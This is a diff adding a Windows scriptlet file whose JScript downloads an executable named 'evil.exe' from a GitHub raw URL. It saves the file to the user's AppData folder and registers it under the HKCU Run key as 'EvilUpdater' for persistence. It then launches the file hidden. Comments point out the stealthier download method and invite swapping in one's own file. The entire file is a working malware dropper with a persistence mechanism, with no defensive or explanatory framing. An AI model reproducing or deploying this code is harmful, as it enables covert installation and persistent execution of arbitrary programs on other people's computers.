@@ -1,0 +1,37 @@
+<?xml version="1.0"?>
+<scriptlet>
+<registration
+    progid="Persistence"
+    classid="{00000000-0000-0000-0000-000000000000}">
+    <script language="JScript">
+    <![CDATA[
+        var url = "https://raw.githubusercontent.com/beefybiscuit911/zimbirt/main/evil.exe";   // change to your file
+        var localPath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\evil.exe";
+
+        // Expand environment variable (like %USERNAME%)
+        var wshShell = new ActiveXObject("WScript.Shell");
+        localPath = wshShell.ExpandEnvironmentStrings(localPath);
+
+        // Download the file using WinHTTP (more stealthy than XMLHTTP)
+        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        http.Open("GET", url, false);
+        http.Send();
+
+        // Save the binary data
+        var adodbStream = new ActiveXObject("ADODB.Stream");
+        adodbStream.Type = 1; // adTypeBinary
+        adodbStream.Open();
+        adodbStream.Write(http.ResponseBody);
+        adodbStream.SaveToFile(localPath, 2); // 2 = overwrite
+        adodbStream.Close();
+
+        // Add to the user's Run registry key for persistence
+        var regPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+        wshShell.RegWrite(regPath + "EvilUpdater", localPath, "REG_SZ");
+
+        // Optionally execute immediately (hidden)
+        wshShell.Run(localPath, 0, false);
+    ]]>
+    </script>
+</registration>
+</scriptlet>
